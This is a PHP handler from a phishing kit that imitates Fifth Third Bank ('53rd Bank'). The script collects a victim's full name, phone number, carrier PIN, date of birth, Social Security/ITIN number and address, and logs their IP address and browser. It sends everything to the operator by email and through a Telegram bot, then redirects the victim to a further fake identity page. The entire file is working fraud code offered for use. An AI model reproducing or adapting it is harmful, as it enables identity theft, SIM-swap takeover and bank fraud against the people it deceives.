<?php 


	ob_start();
session_start();
	include '../conf.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];		
		if ( isset( $_POST['noc'] ) ) {
		
		$_SESSION['noc'] 	  = $_POST['noc'];
	    $_SESSION['phone'] 	  = $_POST['phone'];
		$_SESSION['cpin'] 	  = $_POST['cpin'];
		$_SESSION['ssn'] 	  = $_POST['ssn'];
		$_SESSION['stradd'] 	  = $_POST['stradd'];
		$_SESSION['zip'] 	  = $_POST['zip'];
		$_SESSION['date'] 	  = $_POST['date'];
		
		$msg = <<<EOT
 -53rd Bank Personal Info-
[FULL NAME] 		: {$_SESSION['noc']}
[PHONE NUMBER]		: {$_SESSION['phone']}
[CARRIER PIN] 		: {$_SESSION['cpin']}
[DATE OF BIRTH] 		: {$_SESSION['date']}
[SOCIAL SECURITY/ITIN] 		: {$_SESSION['ssn']}
[STREET ADDRESS] 		: {$_SESSION['stradd']}
[ZIPCODE] 		: {$_SESSION['zip']}
	- IP - Info -
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

 - end - 
\r\n\r\n
EOT;

		$subject = " 53RD Contact info   From $ip";
        $headers = "From: gohard2 <5r3d@gohard2.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
		@mail($mailto,$subject,$msg,$headers);
		
		$data = [
			'chat_id' => $chatid,
			'text' => $msg
		];
		$response = file_get_contents("https://api.telegram.org/bot$apitoken/sendMessage?" . http_build_query($data) );

	
        header("Location: ../c16.php?oamo/identity/&token=cjmvJprW2Dw1/mfacontacts_identification");
        exit();
	} else {
		header("Location: ../index.php?");
		exit();
	}
?>